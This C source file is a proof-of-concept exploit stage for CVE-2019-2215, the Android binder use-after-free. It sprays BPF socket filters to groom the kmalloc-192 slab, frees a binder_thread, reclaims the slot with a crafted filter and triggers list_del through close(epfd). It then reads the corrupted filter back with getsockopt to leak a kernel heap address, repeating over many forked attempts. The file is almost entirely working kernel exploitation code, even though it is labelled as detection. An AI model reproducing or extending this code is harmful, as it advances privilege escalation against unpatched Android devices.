/*
 * bpf_detect3.c — BPF corruption detection with slab grooming + readback
 *
 * Improved approach:
 * 1. BPF spray (200 AF_UNIX sockets) → fill kmalloc-256 slab
 * 2. Open binder, epoll_ctl ADD → creates binder_thread (new page)
 * 3. BINDER_THREAD_EXIT → frees binder_thread → per-CPU freelist (LIFO)
 * 4. SO_ATTACH_FILTER on UDP socket → reclaims the freed slot
 * 5. close(epfd) → corrupts BPF filter at offsets 48-55
 * 6. getsockopt(SO_ATTACH_FILTER) → read back BPF instructions → heap leak!
 * 7. Also test packet filtering behavior
 *
 * Build: .\qemu\build-arm.bat src\bpf_detect3.c bpf_detect3
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <netinet/in.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int)

static int do_test(int attempt) {
    int ret = 0;

    /* Pin to CPU 0 */
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);

    /* === STEP 1: BPF spray to fill kmalloc-192 ===
     * binder_thread is in kmalloc-192 (NOT kmalloc-256!).
     * Use 20 BPF instructions: header(20) + 20*8 = 180 → kmalloc-192.
     */
    int spray[200];
    struct sock_filter nop_insns[20];
    for (int j = 0; j < 19; j++) {
        nop_insns[j].code = BPF_LD | BPF_IMM;
        nop_insns[j].jt = 0; nop_insns[j].jf = 0; nop_insns[j].k = 0;
    }
    nop_insns[19].code = BPF_RET | BPF_K;
    nop_insns[19].jt = 0; nop_insns[19].jf = 0; nop_insns[19].k = 0xFFFF;
    struct sock_fprog nop_prog = { .len = 20, .filter = nop_insns };

    for (int j = 0; j < 200; j++) {
        spray[j] = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (spray[j] >= 0)
            setsockopt(spray[j], SOL_SOCKET, SO_ATTACH_FILTER,
                       &nop_prog, sizeof(nop_prog));
    }

    /* === STEP 2: Pre-create UDP socket for reclaim === */
    int udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (udp_sock < 0) { ret = -1; goto cleanup; }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons(0);
    bind(udp_sock, (struct sockaddr*)&addr, sizeof(addr));

    socklen_t alen = sizeof(addr);
    getsockname(udp_sock, (struct sockaddr*)&addr, &alen);

    struct timeval tv = { .tv_sec = 0, .tv_usec = 50000 };
    setsockopt(udp_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    int sender = socket(AF_INET, SOCK_DGRAM, 0);

    /* === STEP 3: Open binder + epoll (NO BC_ENTER_LOOPER) === */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (bfd < 0) { ret = -1; goto cleanup; }

    uint32_t mx = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);

    int epfd = epoll_create1(O_CLOEXEC);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

    /* === STEP 4: BINDER_THREAD_EXIT → free binder_thread === */
    int thr = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &thr);

    /* === STEP 5: IMMEDIATELY attach BPF → reclaim freed slot ===
     * binder_thread is in kmalloc-192. Use 20 BPF instructions:
     * header(20) + 20*8(160) = 180 → kmalloc-192 to match!
     *
     * sk_filter layout (header=20, insns at offset 20):
     *   insns[3] at offset 44 → binder_thread.wait.lock (spinlock)
     *   insns[3].k at offset 48 → binder_thread.wait.task_list.next
     *   insns[4].code at offset 52 → binder_thread.wait.task_list.prev
     */
    struct sock_filter det_insns[20];
    for (int j = 0; j < 3; j++) {
        det_insns[j].code = BPF_LD | BPF_IMM;
        det_insns[j].jt = 0; det_insns[j].jf = 0; det_insns[j].k = 0;
    }
    /* insns[3]: JEQ k=0 → true → jt=15 → insns[19]=ACCEPT */
    det_insns[3].code = BPF_JMP | BPF_JEQ | BPF_K;
    det_insns[3].jt = 15; det_insns[3].jf = 0; det_insns[3].k = 0;
    /* insns[4-18]: DROP (reached only if JEQ fails = corruption) */
    for (int j = 4; j < 19; j++) {
        det_insns[j].code = BPF_RET | BPF_K;
        det_insns[j].jt = 0; det_insns[j].jf = 0; det_insns[j].k = 0;
    }
    /* insns[19]: ACCEPT (reached via insns[3] jt=15) */
    det_insns[19].code = BPF_RET | BPF_K;
    det_insns[19].jt = 0; det_insns[19].jf = 0; det_insns[19].k = 0xFFFF;

    struct sock_fprog det_prog = { .len = 20, .filter = det_insns };
    if (setsockopt(udp_sock, SOL_SOCKET, SO_ATTACH_FILTER,
                   &det_prog, sizeof(det_prog)) < 0) {
        ret = -1; goto cleanup;
    }

    /* Verify filter works BEFORE close(epfd) */
    char msg1[] = "PRE";
    sendto(sender, msg1, sizeof(msg1), 0, (struct sockaddr*)&addr, sizeof(addr));
    char buf[64];
    ssize_t got1 = recv(udp_sock, buf, sizeof(buf), 0);

    /* === STEP 6: close(epfd) → UAF: list_del on freed binder_thread->wait ===
     * If BPF filter reclaimed the slot, list_del writes heap_addr+48
     * to offsets 48 (insns[3].k) and 52 (insns[4].code+jt+jf). */
    close(epfd);

    /* === STEP 7: Read back BPF filter via getsockopt === */
    struct sock_filter readback[26];
    socklen_t rlen = sizeof(readback);
    int gr = getsockopt(udp_sock, SOL_SOCKET, SO_ATTACH_FILTER,
                        readback, &rlen);

    if (gr == 0 || (gr < 0 && errno == 0)) {
        /* Check what we got back */
        int ninsns = rlen / sizeof(struct sock_filter);
        if (attempt < 3 || readback[3].k != 0) {
            printf("  [%d] getsockopt: %d insns, insns[3]: code=0x%04x jt=%d jf=%d k=0x%08x\n",
                   attempt, ninsns,
                   ninsns > 3 ? readback[3].code : 0,
                   ninsns > 3 ? readback[3].jt : 0,
                   ninsns > 3 ? readback[3].jf : 0,
                   ninsns > 3 ? readback[3].k : 0);
            if (ninsns > 4)
                printf("           insns[4]: code=0x%04x jt=%d jf=%d k=0x%08x\n",
                       readback[4].code, readback[4].jt, readback[4].jf, readback[4].k);
        }

        if (ninsns > 3 && readback[3].k != 0) {
            printf("  [%d] ✓ CORRUPTION at insns[3].k = 0x%08x\n",
                   attempt, readback[3].k);
            if (readback[3].k >= 0xC0000000 && readback[3].k < 0xF0000000) {
                printf("  ✓ KERNEL HEAP LEAK: 0x%08x (base ≈ 0x%08x)\n",
                       readback[3].k, readback[3].k - 48);
                ret = 1;
            }
        }
    } else {
        if (attempt < 3)
            printf("  [%d] getsockopt failed: %s (ret=%d)\n",
                   attempt, strerror(errno), gr);
    }

    /* === STEP 8: Test packet filtering === */
    char msg2[] = "POST";
    sendto(sender, msg2, sizeof(msg2), 0, (struct sockaddr*)&addr, sizeof(addr));
    ssize_t got2 = recv(udp_sock, buf, sizeof(buf), 0);

    if (got1 > 0 && got2 <= 0) {
        printf("  [%d] ✓ FILTER CORRUPTED: pre-UAF recv=%zd, post-UAF recv=%zd\n",
               attempt, got1, got2);
        if (!ret) ret = 1;
    }

    close(udp_sock);
    close(sender);
    close(bfd);

cleanup:
    for (int j = 0; j < 200; j++)
        if (spray[j] >= 0) close(spray[j]);
    return ret;
}

int main(int argc, char **argv) {
    int max_attempts = 100;
    if (argc > 1) max_attempts = atoi(argv[1]);

    printf("=== CVE-2019-2215 BPF Detection v3 (groomed slab + getsockopt) ===\n");
    printf("Attempts: %d, PID=%d, CPUs=%ld\n\n", max_attempts, getpid(),
           sysconf(_SC_NPROCESSORS_ONLN));

    int detected = 0, errors = 0, crashes = 0;

    for (int a = 0; a < max_attempts; a++) {
        if (a % 25 == 0) {
            printf("  [%d/%d] detected=%d\n", a, max_attempts, detected);
            fflush(stdout);
        }

        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int r = do_test(a);
            _exit(r > 0 ? 42 : (r < 0 ? 1 : 0));
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            if (WEXITSTATUS(status) == 42) detected++;
            else if (WEXITSTATUS(status) == 1) errors++;
        } else if (WIFSIGNALED(status)) {
            printf("  [%d] CRASHED signal=%d\n", a, WTERMSIG(status));
            crashes++;
        }
    }

    printf("\n=== RESULTS ===\n");
    printf("  Detected: %d/%d (%.1f%%)\n", detected, max_attempts,
           detected * 100.0 / max_attempts);
    printf("  Crashes: %d, Errors: %d\n", crashes, errors);

    if (detected > 0) {
        printf("\n  ✓ CVE-2019-2215 UAF + BPF reclaim CONFIRMED!\n");
        printf("  Heap address leaked via getsockopt readback.\n");
    }

    return detected > 0 ? 0 : 1;
}
